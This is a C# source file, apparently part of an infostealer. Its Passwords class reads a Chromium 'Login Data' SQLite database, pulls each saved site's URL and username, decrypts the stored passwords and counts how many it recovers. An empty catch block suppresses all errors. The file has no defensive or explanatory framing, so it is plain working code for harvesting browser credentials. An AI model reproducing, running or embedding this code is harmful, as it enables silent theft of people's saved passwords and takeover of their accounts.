using System.Collections.Generic;

namespace exos.Chromium;

internal sealed class Passwords
{
	public static List<Password> Get(string sLoginData)
	{
		List<Password> list = new List<Password>();
		try
		{
			SQLite sQLite = SqlReader.ReadTable(sLoginData, "logins");
			if (sQLite == null)
			{
				return list;
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				Password item = default(Password);
				item.sUrl = Crypto.GetUTF8(sQLite.GetValue(i, 0));
				item.sUsername = Crypto.GetUTF8(sQLite.GetValue(i, 3));
				string value = sQLite.GetValue(i, 5);
				if (value != null)
				{
					item.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, value));
					list.Add(item);
					Counting.Passwords++;
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
